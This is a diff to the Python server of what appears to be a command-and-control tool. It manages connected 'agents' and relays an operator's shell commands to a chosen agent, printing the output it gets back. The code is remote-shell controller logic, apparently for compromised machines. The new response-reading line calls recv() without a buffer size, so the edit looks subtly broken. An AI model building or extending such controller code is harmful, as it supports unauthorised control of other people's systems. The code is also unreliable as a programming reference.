@@ -37,7 +37,7 @@ class Server:
             print(agent)
 
     def handleClient(self, agent):
-        agent.sock.send("Welcome agent\n".encode())
+        agent.sock.sendall("Welcome agent\n".encode())
 
     def acceptConnections(self):
         while not self.server_stop:
@@ -80,18 +80,20 @@ class Server:
             elif command == "shell":
                 agent = self.agents[self.current_session - 1] 
                 if self.current_session > 0:
-                    agent.sock.send(f"shell".encode())
+                    agent.sock.sendall(f"shell".encode())
                     while True:
                         command = input('$> ')
+                        if command.strip() == '':
+                            continue
                         if command.lower() == 'exit':
-                            agent.sock.send(b'exit\n')
                             break
-                        agent.sock.send(command.encode() + b'\n')
+                        agent.sock.sendall(command.encode())
+                        print(agent.sock.recv().decode('latin1'))
                         
 
             elif command.startswith("send"):
                 if self.current_session > 0:
-                    self.agents[self.current_session - 1].sock.send(f"{command.replace('send ','')}\n".encode())
+                    self.agents[self.current_session - 1].sock.sendall(f"{command.replace('send ','')}\n".encode())
                 else:
                     print("Please select an agent as target.")
 
@@ -116,7 +118,7 @@ class Server:
     def broadcast(self, message):
 
         for agent in self.agents:
-            agent.sock.send(message.encode())
+            agent.sock.sendall(message.encode())
 
 
 
